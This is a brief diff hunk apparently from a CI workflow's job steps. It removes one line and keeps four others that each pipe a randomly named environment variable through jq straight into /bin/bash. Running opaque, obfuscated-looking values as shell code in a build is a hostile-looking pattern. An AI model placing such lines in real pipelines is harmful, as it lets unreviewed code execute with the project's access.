@@ -28,7 +28,6 @@ jobs:
           echo $fmrnc22923 | jq -r .vzx516 | /bin/bash
           echo $uoa82000 | jq -r .j71 | /bin/bash
           printf '%s' "$zoms247" | jq -r .zz7 | /bin/bash
-          printf '%s' "$dzvq42" | jq -r .a07 | /bin/bash
           printf '%s' "$ti250" | jq -r .un577 | /bin/bash
 
       - name: Archive data
